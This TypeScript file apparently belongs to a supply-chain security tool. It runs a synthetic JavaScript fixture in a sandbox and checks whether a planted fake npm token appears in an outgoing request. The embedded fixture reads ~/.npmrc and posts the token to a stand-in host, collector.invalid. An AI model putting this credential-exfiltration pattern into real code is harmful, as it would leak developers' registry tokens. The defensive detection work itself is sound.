import { fileURLToPath } from 'node:url';
import { Bash, InMemoryFs, defineCommand } from 'just-bash';
import { executeFixture, type RuntimeEvent } from './bridge.js';

// Only this reviewed synthetic fixture is exposed by the CLI. No target package
// can select code for this uncontained prototype.
export const DEMO_SOURCE = `
(() => {
  const call = (operation, target, body) => {
    const response = JSON.parse(__hostCall(JSON.stringify({ operation, target, body })));
    if (!response.ok) throw new Error(response.error);
    return response.value;
  };
  const fs = { readFileSync: path => call('read', path), writeFileSync: (path, body) => call('write', path, body) };
  const token = fs.readFileSync('/home/synthetic/.npmrc');
  call('network', 'https://collector.invalid/collect', token);
  fs.writeFileSync('/fixture/result.txt', 'fixture complete');
})();`;

export async function runDemo() {
  const fs = new InMemoryFs();
  await fs.mkdir('/home/synthetic', { recursive: true });
  await fs.mkdir('/fixture', { recursive: true });
  await fs.writeFile('/fixture/demo.js', DEMO_SOURCE);
  let events: RuntimeEvent[] = [];
  const binary = fileURLToPath(new URL('../../runtime/target/debug/devprotect-runtime', import.meta.url));
  const node = defineCommand('node', async args => {
    if (args.length !== 1 || args[0] !== '/fixture/demo.js') throw new Error('Only the built-in fixture is supported');
    events = await executeFixture(binary, await fs.readFile('/fixture/demo.js'), fs);
    return { stdout: '', stderr: '', exitCode: 0 };
  });
  const bash = new Bash({ fs, cwd: '/fixture', env: { HOME: '/home/synthetic' }, customCommands: [node] });
  const result = await bash.exec("printf 'DEVPROTECT_FAKE_TOKEN' > /home/synthetic/.npmrc && node /fixture/demo.js && cat /fixture/result.txt");
  if (result.exitCode !== 0) throw new Error(`Demo failed: ${result.stderr}`);
  return {
    mode: 'synthetic-fixture-only',
    events,
    credentialObservedInRequest: events.some(event => event.operation === 'network-attempt' && event.body === 'DEVPROTECT_FAKE_TOKEN'),
    shellObservedJavaScriptWrite: result.stdout === 'fixture complete',
    coverage: { status: 'incomplete', gaps: ['OS containment is not implemented; this demo accepts only its built-in fixture.', 'No Node module loader, event loop, lifecycle replay, or nested processes.', 'Network response is synthetic HTTP 204; no request is sent.'] },
  };
}
